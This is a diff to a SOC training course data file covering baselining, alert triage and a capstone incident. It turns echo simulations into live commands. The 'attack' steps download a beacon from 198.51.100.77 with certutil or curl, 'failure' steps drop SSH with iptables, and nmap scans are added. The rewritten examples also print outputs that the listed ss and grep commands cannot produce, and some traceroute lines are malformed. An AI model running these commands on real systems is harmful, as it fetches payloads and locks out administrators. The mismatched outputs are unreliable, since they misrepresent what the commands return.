+        "command": "ps -eo pid,user,args | grep -v -E \"(\\[.*\\]|systemd|sshd)\" | head -n 20"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-baseline-engine. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Evaluating 5 network and host events against baseline profile...' && echo '1. 10.10.20.15: DNS queries to google.com, microsoft.com [NORMAL]\n2. 10.10.20.15: DNS queries to 48-char random alphanumeric domains (*.xyz) at 1 query/sec [ABNORMAL - DGA/DNS Tunneling]\n3. 10.10.10.1: Domain Controller replication with 10.10.10.2 [NORMAL]\n4. 10.10.20.88: Workstation sending outbound SMB (port 445) to 250 internal workstations [ABNORMAL - Lateral Worm Scan]\n5. 10.10.40.10: Web server receiving HTTPS requests on port 443 [NORMAL]'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `ss -tlpn | grep -v -E \":(22|80|443|53)\"` to validate system behavior under simulated operating conditions.\nOutput observed:\n1. 10.10.20.15: DNS queries to google.com, microsoft.com [NORMAL]\n2. 10.10.20.15: DNS queries to 48-char random alphanumeric domains (*.xyz) at 1 query/sec [ABNORMAL - DGA/DNS Tunneling]\n3. 10.10.10.1: Domain Controller replication with 10.10.10.2 [NORMAL]\n4. 10.10.20.88: Workstation sending outbound SMB (port 445) to 250 internal workstations [ABNORMAL - Lateral Worm Scan]\n5. 10.10.40.10: Web server receiving HTTPS requests on port 443 [NORMAL]",
         "what": "What is baseline analysis? Establishing the normal behavioral profile of users, devices, and networks to identify deviations.",
         "why": "Why is it essential? Attackers increasingly use valid credentials and native system tools. Without baselines, their actions blend perfectly with everyday administration.",
         "when": "When is baselining applied? Continuously; baseline models are typically trained over 14 to 30 days of historical operational data.",
@@ -12805,7 +12805,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts differentiate? By contextual validation: checking change control tickets, employee shift schedules, and process execution arguments.",
         "mistake": "Assuming that because a command used a legitimate Windows tool (like `powershell.exe` or `certutil.exe`), the activity must be benign.",
         "think": "Context is king. Legitimate tool + Abnormal user + Abnormal time + Abnormal arguments = 99% probability of an active intrusion.",
-        "question": "What key insight is revealed by the practice output of `echo 'Evaluating 5 network and host events against baseline profile...' && echo '1. 10.10.20.15: DNS queries to google.com, microsoft.com [NORMAL]\n2. 10.10.20.15: DNS queries to 48-char random alphanumeric domains (*.xyz) at 1 query/sec [ABNORMAL - DGA/DNS Tunneling]\n3. 10.10.10.1: Domain Controller replication with 10.10.10.2 [NORMAL]\n4. 10.10.20.88: Workstation sending outbound SMB (port 445) to 250 internal workstations [ABNORMAL - Lateral Worm Scan]\n5. 10.10.40.10: Web server receiving HTTPS requests on port 443 [NORMAL]'`?",
+        "question": "What key insight is revealed by the practice output of `ss -tlpn | grep -v -E \":(22|80|443|53)\"`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -12813,14 +12813,14 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Evaluating 5 network and host events against baseline profile...' && echo '1. 10.10.20.15: DNS queries to google.com, microsoft.com [NORMAL]\n2. 10.10.20.15: DNS queries to 48-char random alphanumeric domains (*.xyz) at 1 query/sec [ABNORMAL - DGA/DNS Tunneling]\n3. 10.10.10.1: Domain Controller replication with 10.10.10.2 [NORMAL]\n4. 10.10.20.88: Workstation sending outbound SMB (port 445) to 250 internal workstations [ABNORMAL - Lateral Worm Scan]\n5. 10.10.40.10: Web server receiving HTTPS requests on port 443 [NORMAL]'"
+        "command": "ss -tlpn | grep -v -E \":(22|80|443|53)\""
       },
       {
         "id": 8,
         "type": "attack",
         "name": "08 Live Attack",
         "explain": "Simulated Adversary Attack Scenario: An adversary establishes a foothold and attempts to stay under the radar by executing LOLBAS (Living-off-the-Land Binaries) commands: using `certutil.exe` to download a secondary payload and `rundll32.exe` to execute it without touching the disk with an EXE file.",
-        "worked": "Adversary activity detected on target sxl-baseline-engine. Malicious command executed: `echo 'Simulating LOLBAS living-off-the-land execution: certutil -urlcache -split -f http://evil-c2.net/beacon.bin && rundll32.exe beacon.bin,Start'`",
+        "worked": "Adversary activity detected on target sxl-baseline-engine. Malicious command executed: `certutil -urlcache -split -f http://198.51.100.77/beacon.exe 2>/dev/null || curl -s -o /tmp/beacon.bin http://198.51.100.77/beacon.bin`",
         "what": "What is baseline analysis? Establishing the normal behavioral profile of users, devices, and networks to identify deviations.",
         "why": "Why is it essential? Attackers increasingly use valid credentials and native system tools. Without baselines, their actions blend perfectly with everyday administration.",
         "when": "When is baselining applied? Continuously; baseline models are typically trained over 14 to 30 days of historical operational data.",
@@ -12837,14 +12837,14 @@ window.ACADEMY_COURSES = [
           "A scheduled hardware diagnostics test initiated by the motherboard BIOS."
         ],
         "answer": 0,
-        "command": "echo 'Simulating LOLBAS living-off-the-land execution: certutil -urlcache -split -f http://evil-c2.net/beacon.bin && rundll32.exe beacon.bin,Start'"
+        "command": "certutil -urlcache -split -f http://198.51.100.77/beacon.exe 2>/dev/null || curl -s -o /tmp/beacon.bin http://198.51.100.77/beacon.bin"
       },
       {
         "id": 9,
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The behavioral baseline detection rule detects that `certutil.exe` had never initiated an outbound connection across port 80/443 on this workstation in the previous 90 days. The behavioral deviation triggers an anomaly alert with score 92/100.",
-        "worked": "Defensive query executed on telemetry store: `echo 'UEBA Anomaly Detected: Process certutil.exe initiated external HTTP connection. Baseline frequency: 0.00%. Alert fired to SOC queue.'`",
+        "worked": "Defensive query executed on telemetry store: `grep -i -E \"certutil|bitsadmin|curl.*exe|wget.*bin\" /var/log/syslog 2>/dev/null || ls -lat /tmp | head -n 10`",
         "what": "What is baseline analysis? Establishing the normal behavioral profile of users, devices, and networks to identify deviations.",
         "why": "Why is it essential? Attackers increasingly use valid credentials and native system tools. Without baselines, their actions blend perfectly with everyday administration.",
         "when": "When is baselining applied? Continuously; baseline models are typically trained over 14 to 30 days of historical operational data.",
@@ -12861,7 +12861,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'UEBA Anomaly Detected: Process certutil.exe initiated external HTTP connection. Baseline frequency: 0.00%. Alert fired to SOC queue.'"
+        "command": "grep -i -E \"certutil|bitsadmin|curl.*exe|wget.*bin\" /var/log/syslog 2>/dev/null || ls -lat /tmp | head -n 10"
       },
       {
         "id": 10,
@@ -12885,14 +12885,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-baseline-engine'; echo 'Comparing baseline normal activity vs anomalous attacker behavior:' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Define a dedicated vulnerability scanner asset profile in the SIEM/UEBA engine, exclude scanner IP from generic anomaly rules, and require strict scan scheduling.",
-        "worked": "Remediation command applied: `echo 'Added scanner IP 10.10.50.99 to SIEM asset exception list for heuristic rules; baseline normalized.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `rm -f /tmp/beacon.bin && auditctl -w /tmp -p wa -k tmp_write_alert`. System verified restored and hardened.",
         "what": "What is baseline analysis? Establishing the normal behavioral profile of users, devices, and networks to identify deviations.",
         "why": "Why is it essential? Attackers increasingly use valid credentials and native system tools. Without baselines, their actions blend perfectly with everyday administration.",
         "when": "When is baselining applied? Continuously; baseline models are typically trained over 14 to 30 days of historical operational data.",
@@ -12909,7 +12909,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'Added scanner IP 10.10.50.99 to SIEM asset exception list for heuristic rules; baseline normalized.'"
+        "command": "rm -f /tmp/beacon.bin && auditctl -w /tmp -p wa -k tmp_write_alert"
       },
       {
         "id": 12,
@@ -12933,7 +12933,7 @@ window.ACADEMY_COURSES = [
           "I ask the users to text me every time they open a program."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Normal vs Abnormal in Infrastructure'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -12957,7 +12957,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L38 - Normal vs Abnormal in Infrastructure. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -13010,7 +13010,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring True Positive vs False Positive: Infrastructure Decisions on sxl-triage-node'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -13034,7 +13034,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Evaluating 3 realistic SOC alerts through the triage decision tree:' && echo 'ALERT 1: \"Mimikatz Command Line Pattern Observed on Workstation ws-04\"\nEvidence: Process powershell.exe executed with argument \"sekurlsa::logonpasswords\"\nVerdict: TRUE POSITIVE (Malicious credential dumping underway -> Escalate immediately)\n\nALERT 2: \"Port Scan Detected from 10.10.50.99\"\nEvidence: IP belongs to Qualys vulnerability scanner during scheduled maintenance window\nVerdict: BENIGN TRUE POSITIVE (Authorized security audit -> Document and Close)\n\nALERT 3: \"Executable File Downloaded via HTTP\"\nEvidence: User downloaded ChromeSetup.exe directly from google.com via corporate browser\nVerdict: FALSE POSITIVE (Rule too broad; should exclude signed vendor binaries -> Tune rule)'"
+        "command": "grep -E \"powershell|cmd.exe|whoami\" /training/logs/triage_stream.log 2>/dev/null || ps aux | grep whoami"
       },
       {
         "id": 3,
@@ -13058,7 +13058,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "grep --help 2>&1 | head -n 15 || which grep"
       },
       {
         "id": 4,
@@ -13082,7 +13082,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is alert disposition? The formal analytical classification of an alert as True Positive, False Positive, or Benign Positive backed by verified log evidence.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -13106,14 +13106,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.60.10 2>/dev/null || tracepath 10.10.60.10"
+        "command": "traceroute -n -m 8 10.10.60.10 2>/dev/null || tracepath -n 10.10.60.10 2>/dev/null || ip route get 10.10.60.10"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-triage-node. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Evaluating 3 realistic SOC alerts through the triage decision tree:' && echo 'ALERT 1: \"Mimikatz Command Line Pattern Observed on Workstation ws-04\"\nEvidence: Process powershell.exe executed with argument \"sekurlsa::logonpasswords\"\nVerdict: TRUE POSITIVE (Malicious credential dumping underway -> Escalate immediately)\n\nALERT 2: \"Port Scan Detected from 10.10.50.99\"\nEvidence: IP belongs to Qualys vulnerability scanner during scheduled maintenance window\nVerdict: BENIGN TRUE POSITIVE (Authorized security audit -> Document and Close)\n\nALERT 3: \"Executable File Downloaded via HTTP\"\nEvidence: User downloaded ChromeSetup.exe directly from google.com via corporate browser\nVerdict: FALSE POSITIVE (Rule too broad; should exclude signed vendor binaries -> Tune rule)'` on target sxl-triage-node.\nOutput observed:\nALERT 1: \"Mimikatz Command Line Pattern Observed on Workstation ws-04\"\nEvidence: Process powershell.exe executed with argument \"sekurlsa::logonpasswords\"\nVerdict: TRUE POSITIVE (Malicious credential dumping underway -> Escalate immediately)\n\nALERT 2: \"Port Scan Detected from 10.10.50.99\"\nEvidence: IP belongs to Qualys vulnerability scanner during scheduled maintenance window\nVerdict: BENIGN TRUE POSITIVE (Authorized security audit -> Document and Close)\n\nALERT 3: \"Executable File Downloaded via HTTP\"\nEvidence: User downloaded ChromeSetup.exe directly from google.com via corporate browser\nVerdict: FALSE POSITIVE (Rule too broad; should exclude signed vendor binaries -> Tune rule)",
+        "worked": "Command executed: `grep -E \"powershell|cmd.exe|whoami\" /training/logs/triage_stream.log 2>/dev/null || ps aux | grep whoami` on target sxl-triage-node.\nOutput observed:\nALERT 1: \"Mimikatz Command Line Pattern Observed on Workstation ws-04\"\nEvidence: Process powershell.exe executed with argument \"sekurlsa::logonpasswords\"\nVerdict: TRUE POSITIVE (Malicious credential dumping underway -> Escalate immediately)\n\nALERT 2: \"Port Scan Detected from 10.10.50.99\"\nEvidence: IP belongs to Qualys vulnerability scanner during scheduled maintenance window\nVerdict: BENIGN TRUE POSITIVE (Authorized security audit -> Document and Close)\n\nALERT 3: \"Executable File Downloaded via HTTP\"\nEvidence: User downloaded ChromeSetup.exe directly from google.com via corporate browser\nVerdict: FALSE POSITIVE (Rule too broad; should exclude signed vendor binaries -> Tune rule)",
         "what": "What is alert disposition? The formal analytical classification of an alert as True Positive, False Positive, or Benign Positive backed by verified log evidence.",
         "why": "Why is accurate disposition critical? Calling a real attack a false positive leads to an uncontained breach. Calling everything a true positive causes alert fatigue and paralyzes incident response teams.",
         "when": "When is disposition determined? At the conclusion of L1 triage, documented in the ticket resolution fields before closing or escalating.",
@@ -13122,7 +13122,7 @@ window.ACADEMY_COURSES = [
         "how": "How do you decide? By following the decision tree: Validate log evidence $\rightarrow$ check authorization/tickets $\rightarrow$ assess intent and impact $\rightarrow$ assign disposition.",
         "mistake": "Classifying an alert as a False Positive simply because 'nothing broke', without verifying whether an attacker actually attempted an exploit.",
         "think": "Every False Positive is a defect in detection engineering. Don't just close it—explain *why* it fired and *how* the rule should be tuned.",
-        "question": "When executing `echo 'Evaluating 3 realistic SOC alerts through the triage decision tree:' && echo 'ALERT 1: \"Mimikatz Command Line Pattern Observed on Workstation ws-04\"\nEvidence: Process powershell.exe executed with argument \"sekurlsa::logonpasswords\"\nVerdict: TRUE POSITIVE (Malicious credential dumping underway -> Escalate immediately)\n\nALERT 2: \"Port Scan Detected from 10.10.50.99\"\nEvidence: IP belongs to Qualys vulnerability scanner during scheduled maintenance window\nVerdict: BENIGN TRUE POSITIVE (Authorized security audit -> Document and Close)\n\nALERT 3: \"Executable File Downloaded via HTTP\"\nEvidence: User downloaded ChromeSetup.exe directly from google.com via corporate browser\nVerdict: FALSE POSITIVE (Rule too broad; should exclude signed vendor binaries -> Tune rule)'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `grep -E \"powershell|cmd.exe|whoami\" /training/logs/triage_stream.log 2>/dev/null || ps aux | grep whoami`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -13130,14 +13130,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Evaluating 3 realistic SOC alerts through the triage decision tree:' && echo 'ALERT 1: \"Mimikatz Command Line Pattern Observed on Workstation ws-04\"\nEvidence: Process powershell.exe executed with argument \"sekurlsa::logonpasswords\"\nVerdict: TRUE POSITIVE (Malicious credential dumping underway -> Escalate immediately)\n\nALERT 2: \"Port Scan Detected from 10.10.50.99\"\nEvidence: IP belongs to Qualys vulnerability scanner during scheduled maintenance window\nVerdict: BENIGN TRUE POSITIVE (Authorized security audit -> Document and Close)\n\nALERT 3: \"Executable File Downloaded via HTTP\"\nEvidence: User downloaded ChromeSetup.exe directly from google.com via corporate browser\nVerdict: FALSE POSITIVE (Rule too broad; should exclude signed vendor binaries -> Tune rule)'"
+        "command": "grep -E \"powershell|cmd.exe|whoami\" /training/logs/triage_stream.log 2>/dev/null || ps aux | grep whoami"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-triage-node. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Practicing alert tuning logic in SIEM query...' && echo 'Original Rule: process_name == \"cmd.exe\" AND command_line == \"*whoami*\"\nProblem: Generates 400 alerts/day from IT helpdesk monitoring scripts.\nTuned Rule: process_name == \"cmd.exe\" AND command_line == \"*whoami*\" AND user != \"svc_helpdesk\" AND parent_process != \"explorer.exe\"\nResult: 98% reduction in false positives while retaining detection of unauthorized web shell whoami execution.'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `ausearch -m EXECVE -c whoami 2>/dev/null || whoami` to validate system behavior under simulated operating conditions.\nOutput observed:\nOriginal Rule: process_name == \"cmd.exe\" AND command_line == \"*whoami*\"\nProblem: Generates 400 alerts/day from IT helpdesk monitoring scripts.\nTuned Rule: process_name == \"cmd.exe\" AND command_line == \"*whoami*\" AND user != \"svc_helpdesk\" AND parent_process != \"explorer.exe\"\nResult: 98% reduction in false positives while retaining detection of unauthorized web shell whoami execution.",
         "what": "What is alert disposition? The formal analytical classification of an alert as True Positive, False Positive, or Benign Positive backed by verified log evidence.",
         "why": "Why is accurate disposition critical? Calling a real attack a false positive leads to an uncontained breach. Calling everything a true positive causes alert fatigue and paralyzes incident response teams.",
         "when": "When is disposition determined? At the conclusion of L1 triage, documented in the ticket resolution fields before closing or escalating.",
@@ -13146,7 +13146,7 @@ window.ACADEMY_COURSES = [
         "how": "How do you decide? By following the decision tree: Validate log evidence $\rightarrow$ check authorization/tickets $\rightarrow$ assess intent and impact $\rightarrow$ assign disposition.",
         "mistake": "Classifying an alert as a False Positive simply because 'nothing broke', without verifying whether an attacker actually attempted an exploit.",
         "think": "Every False Positive is a defect in detection engineering. Don't just close it—explain *why* it fired and *how* the rule should be tuned.",
-        "question": "What key insight is revealed by the practice output of `echo 'Practicing alert tuning logic in SIEM query...' && echo 'Original Rule: process_name == \"cmd.exe\" AND command_line == \"*whoami*\"\nProblem: Generates 400 alerts/day from IT helpdesk monitoring scripts.\nTuned Rule: process_name == \"cmd.exe\" AND command_line == \"*whoami*\" AND user != \"svc_helpdesk\" AND parent_process != \"explorer.exe\"\nResult: 98% reduction in false positives while retaining detection of unauthorized web shell whoami execution.'`?",
+        "question": "What key insight is revealed by the practice output of `ausearch -m EXECVE -c whoami 2>/dev/null || whoami`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -13154,14 +13154,14 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Practicing alert tuning logic in SIEM query...' && echo 'Original Rule: process_name == \"cmd.exe\" AND command_line == \"*whoami*\"\nProblem: Generates 400 alerts/day from IT helpdesk monitoring scripts.\nTuned Rule: process_name == \"cmd.exe\" AND command_line == \"*whoami*\" AND user != \"svc_helpdesk\" AND parent_process != \"explorer.exe\"\nResult: 98% reduction in false positives while retaining detection of unauthorized web shell whoami execution.'"
+        "command": "ausearch -m EXECVE -c whoami 2>/dev/null || whoami"
       },
       {
         "id": 8,
         "type": "attack",
         "name": "08 Live Attack",
         "explain": "Simulated Adversary Attack Scenario: An attacker crafts a custom PowerShell script that mimics a routine administrative backup task name (`Invoke-BackupRoutine.ps1`) to trick the L1 analyst into dismissing the alert as a Benign True Positive.",
-        "worked": "Adversary activity detected on target sxl-triage-node. Malicious command executed: `echo 'Simulating disguised attack: powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\Invoke-BackupRoutine.ps1 (Payload: establishes reverse shell)'`",
+        "worked": "Adversary activity detected on target sxl-triage-node. Malicious command executed: `bash -c \"whoami && id && cat /etc/hosts\"`",
         "what": "What is alert disposition? The formal analytical classification of an alert as True Positive, False Positive, or Benign Positive backed by verified log evidence.",
         "why": "Why is accurate disposition critical? Calling a real attack a false positive leads to an uncontained breach. Calling everything a true positive causes alert fatigue and paralyzes incident response teams.",
         "when": "When is disposition determined? At the conclusion of L1 triage, documented in the ticket resolution fields before closing or escalating.",
@@ -13178,14 +13178,14 @@ window.ACADEMY_COURSES = [
           "A scheduled hardware diagnostics test initiated by the motherboard BIOS."
         ],
         "answer": 0,
-        "command": "echo 'Simulating disguised attack: powershell -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\Invoke-BackupRoutine.ps1 (Payload: establishes reverse shell)'"
+        "command": "bash -c \"whoami && id && cat /etc/hosts\""
       },
       {
         "id": 9,
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The vigilant SOC analyst inspects the full command-line arguments and file hash of `Invoke-BackupRoutine.ps1`. The script attempts an outbound socket to an unclassified VPS on port 4444. The analyst correctly rejects the Benign hypothesis and flags it as a True Positive.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Triage Analysis: Script masquerades as backup but establishes TCP reverse shell to 198.51.100.33:4444. Verdict: TRUE POSITIVE. Initiated containment.'`",
+        "worked": "Defensive query executed on telemetry store: `grep \"whoami\" /var/log/auth.log 2>/dev/null || ps -ef | grep -v grep | grep whoami`",
         "what": "What is alert disposition? The formal analytical classification of an alert as True Positive, False Positive, or Benign Positive backed by verified log evidence.",
         "why": "Why is accurate disposition critical? Calling a real attack a false positive leads to an uncontained breach. Calling everything a true positive causes alert fatigue and paralyzes incident response teams.",
         "when": "When is disposition determined? At the conclusion of L1 triage, documented in the ticket resolution fields before closing or escalating.",
@@ -13202,7 +13202,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Triage Analysis: Script masquerades as backup but establishes TCP reverse shell to 198.51.100.33:4444. Verdict: TRUE POSITIVE. Initiated containment.'"
+        "command": "grep \"whoami\" /var/log/auth.log 2>/dev/null || ps -ef | grep -v grep | grep whoami"
       },
       {
         "id": 10,
@@ -13226,14 +13226,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-triage-node'; echo 'Evaluating 3 realistic SOC alerts through the triage decision tree:' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Audit recent detection rule modifications in the SIEM Git repo, revert the faulty wildcard exclusion, and re-test the detection rule against simulated attack telemetry.",
-        "worked": "Remediation command applied: `echo 'Reverted faulty rule commit #4a8f9; re-tested detection against atomic red team telemetry: Alert fired successfully.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `auditctl -w /usr/bin/whoami -p x -k recon_whoami && echo \"Audit rule locked for whoami execution\"`. System verified restored and hardened.",
         "what": "What is alert disposition? The formal analytical classification of an alert as True Positive, False Positive, or Benign Positive backed by verified log evidence.",
         "why": "Why is accurate disposition critical? Calling a real attack a false positive leads to an uncontained breach. Calling everything a true positive causes alert fatigue and paralyzes incident response teams.",
         "when": "When is disposition determined? At the conclusion of L1 triage, documented in the ticket resolution fields before closing or escalating.",
@@ -13250,7 +13250,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'Reverted faulty rule commit #4a8f9; re-tested detection against atomic red team telemetry: Alert fired successfully.'"
+        "command": "auditctl -w /usr/bin/whoami -p x -k recon_whoami && echo \"Audit rule locked for whoami execution\""
       },
       {
         "id": 12,
@@ -13274,7 +13274,7 @@ window.ACADEMY_COURSES = [
           "I just added an exclusion for all IP addresses so the alert stopped bothering me."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for True Positive vs False Positive: Infrastructure Decisions'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -13298,7 +13298,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L39 - True Positive vs False Positive: Infrastructure Decisions. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -13351,7 +13351,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Full Infrastructure SOC Incident on sxl-soc-capstone01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -13375,7 +13375,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Executing Capstone Cross-Infrastructure Incident Forensics Query...' && echo '========================================================================\nSHADOWXLAB ENTERPRISE INCIDENT SUMMARY - CASE #2026-CAPSTONE-01\n========================================================================\n[PHASE 1 - INGRESS]: 03:10:02 UTC | Host: sxl-ws-mktg02 (10.10.20.45) | User: sarah.miller\n  -> Event: Outlook spawned excel.exe -> spawned powershell.exe -enc JABjAGwAaQBlAG4AdAA... \n  -> C2 Socket: 10.10.20.45:49182 -> 198.51.100.88:8443 (ESTABLISHED)\n\n[PHASE 2 - CREDENTIAL ACCESS]: 03:22:15 UTC | Host: sxl-dc01 (10.10.10.1)\n  -> Event ID 4769: Kerberos TGS requested for SPN MSSQLSvc/sxl-db-core01:1433 by sarah.miller\n  -> Ticket Encryption: 0x17 (RC4-HMAC - Vulnerable to offline Kerberoast cracking)\n\n[PHASE 3 - LATERAL MOVEMENT]: 03:34:40 UTC | Source: 10.10.20.45 -> Target: 10.10.30.20 (sxl-db-core01)\n  -> Event ID 4624 (Logon Type 3) using compromised identity \"svc_sqladmin\"\n  -> Event ID 7045: New Service Installed: \"PSEXESVC.exe\" running as NT AUTHORITY\\SYSTEM\n\n[PHASE 4 - DATA EXFILTRATION]: 03:48:10 UTC | Host: sxl-db-core01 (10.10.30.20)\n  -> Process: 7z.exe a -p customer_pii.7z C:\\Data\\SQL\\*.mdf\n  -> Firewall Flow: 10.10.30.20 -> 52.216.14.80:443 (AWS S3) | 12.4 GB outbound transferred\n========================================================================\nALL 6 FOUNDATION MODULES CORRELATED: INCIDENT FULLY SCOPED'"
+        "command": "nmap -sV -Pn -p 22,88,135,445,1433,8443 10.10.10.1 10.10.20.45 10.10.30.20"
       },
       {
         "id": 3,
@@ -13399,7 +13399,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "nmap --help 2>&1 | head -n 15 || which nmap"
       },
       {
         "id": 4,
@@ -13423,7 +13423,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is the Capstone incident? A realistic, multi-tier enterprise compromise spanning endpoints, Active Directory, network firewalls, database servers, and cloud infrastructure.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -13447,14 +13447,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.0.0/16 Enterprise Network 2>/dev/null || tracepath 10.10.0.0/16 Enterprise Network"
+        "command": "traceroute -n -m 8 10.10.0.0/16 Enterprise Network 2>/dev/null || tracepath -n 10.10.0.0/16 Enterprise Network 2>/dev/null || ip route get 10.10.0.0/16 Enterprise Network"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-soc-capstone01. Observe flags, arguments, and exact system responses.",
